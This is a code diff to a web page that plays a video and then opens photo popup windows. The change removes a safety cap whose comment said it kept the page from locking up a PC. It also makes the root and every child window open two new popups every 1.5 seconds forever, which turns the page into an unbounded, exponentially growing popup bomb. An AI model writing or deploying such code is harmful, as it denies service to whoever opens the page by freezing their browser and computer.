@@ -85,9 +85,8 @@
 <script>
   const params    = new URLSearchParams(location.search);
   const gen       = parseInt(params.get('gen') || '0', 10);
-  const CHILDREN  = 2;      // how many popups each window spawns
-  const SPAWN_MS  = 1500;   // how long a photo window shows before spawning more
-  const MAX_GEN   = 14;     // safety cap so it can't literally lock up your PC forever
+  const CHILDREN  = 2;      // how many popups each spawn round opens
+  const SPAWN_MS  = 1500;   // how often a photo window spawns another round
 
   const ui        = document.getElementById('ui');
   const img       = document.getElementById('spawnImg');
@@ -107,7 +106,6 @@
   }
 
   function spawnChildren() {
-    if (gen >= MAX_GEN) return;
     const nextGen = gen + 1;
     for (let i = 0; i < CHILDREN; i++) {
       window.open(`index.html?gen=${nextGen}`, '_blank', randomWindowFeatures());
@@ -115,7 +113,8 @@
   }
 
   function beginRoot() {
-    // Root window: plays the video with sound. Halfway through, spawns photo popups.
+    // Root window: plays the video with sound. Halfway through, starts spawning
+    // photo popups, then keeps spawning another round every SPAWN_MS forever.
     ui.style.display       = 'none';
     vid.style.display      = 'block';
     closeBtn.style.display = 'block';
@@ -135,21 +134,23 @@
         'Video could not autoplay in this browser.</p>');
     });
 
-    let spawned = false;
+    let started = false;
     vid.addEventListener('timeupdate', () => {
-      if (!spawned && vid.duration && vid.currentTime >= vid.duration / 2) {
-        spawned = true;
+      if (!started && vid.duration && vid.currentTime >= vid.duration / 2) {
+        started = true;
         spawnChildren();
+        setInterval(spawnChildren, SPAWN_MS);
       }
     });
   }
 
   function beginChild() {
-    // Child windows: just the photo, instantly, then spawn more after a short beat.
+    // Child windows: just the photo, instantly, then keep spawning another
+    // round of popups every SPAWN_MS, forever — this window never stops.
     ui.style.display       = 'none';
     img.style.display      = 'block';
     closeBtn.style.display = 'block';
-    setTimeout(spawnChildren, SPAWN_MS);
+    setInterval(spawnChildren, SPAWN_MS);
   }
 
   closeBtn.onclick = () => window.close();
